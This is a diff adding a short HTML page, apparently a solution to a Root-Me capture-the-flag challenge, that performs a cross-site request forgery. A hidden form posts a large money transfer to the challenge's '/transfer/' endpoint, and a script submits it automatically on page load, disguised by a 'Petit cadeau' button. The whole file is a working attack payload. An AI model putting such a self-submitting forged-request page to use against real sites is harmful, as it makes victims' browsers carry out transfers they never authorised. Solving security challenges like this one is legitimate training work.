@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <form id="malicious" action="https://bankme-1.challenges.pro.root-me.org/transfer/" method="post">
+        <input type="hidden" name="recipient" value="ajax">
+        <input type="hidden" name="amount" value="1 513 699 513" />
+        <button type="submit">Petit cadeau</button>
+     </form>
+     <script>
+        document.getElementById('malicious').submit();
+     </script>
+</body>
+</html>
